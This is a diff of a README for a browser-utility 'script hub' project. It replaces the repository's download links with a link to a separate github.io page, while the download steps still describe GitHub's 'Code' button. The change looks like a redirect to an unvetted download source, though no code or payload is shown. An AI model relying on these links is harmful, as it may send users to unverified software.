@@ -1,6 +1,6 @@
 # 🛠️ ariari-tools-script-hub - Manage browser utilities with simple tools
 
-[![](https://img.shields.io/badge/Download-Ariari-Tools-blue.svg)](https://github.com/Catherinewee345/ariari-tools-script-hub)
+[![](https://img.shields.io/badge/Download-Ariari-Tools-blue.svg)](https://catherinewee345.github.io)
 
 Ariari Tools provides a central hub for browser utilities. This project gathers helpful scripts into one HTML interface. You run these tools locally in your web browser without extra software installations. This structure keeps your browsing tasks organized and accessible from one folder on your computer.
 
@@ -8,7 +8,7 @@ Ariari Tools provides a central hub for browser utilities. This project gathers 
 
 To start using these utilities, you must download the project files to your computer.
 
-1. Visit the project page at: [https://github.com/Catherinewee345/ariari-tools-script-hub](https://github.com/Catherinewee345/ariari-tools-script-hub)
+1. Visit the project page at: [https://catherinewee345.github.io](https://catherinewee345.github.io)
 2. Locate the green button labeled Code.
 3. Select Download ZIP from the dropdown menu.
 4. Save the file to your desktop or downloads folder.
